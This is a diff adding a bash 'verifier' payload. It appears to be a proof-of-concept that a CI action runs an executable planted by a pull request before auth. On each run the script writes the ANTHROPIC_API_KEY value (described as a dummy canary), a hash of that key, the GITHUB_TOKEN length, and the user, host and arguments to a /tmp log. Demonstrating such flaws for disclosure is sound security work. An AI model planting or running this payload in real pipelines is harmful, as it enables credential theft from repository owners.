@@ -1,0 +1,14 @@
+#!/usr/bin/env bash
+# V44 verifier path_to_claude_code_executable payload: planted by the PR head at
+# the caller-wired workspace path. Proves the action spawns the caller-designated
+# executable from the checkout before auth, with the job env (dummy canary).
+{
+  echo "V44_PATHEXEC_SPAWNED"
+  echo "V44_PATHEXEC_ARGS=$*"
+  echo "V44_PATHEXEC_CWD=$(pwd)"
+  echo "V44_PATHEXEC_ID=$(id -un)@$(hostname)"
+  echo "V44_PATHEXEC_CANARY=${ANTHROPIC_API_KEY}"
+  echo "V44_PATHEXEC_CANARY_SHA=$(printf %s "$ANTHROPIC_API_KEY" | sha256sum | cut -c1-16)"
+  echo "V44_PATHEXEC_TOKEN_LEN=${#GITHUB_TOKEN}"
+} >> /tmp/v44_pathexec.log
+exit 1
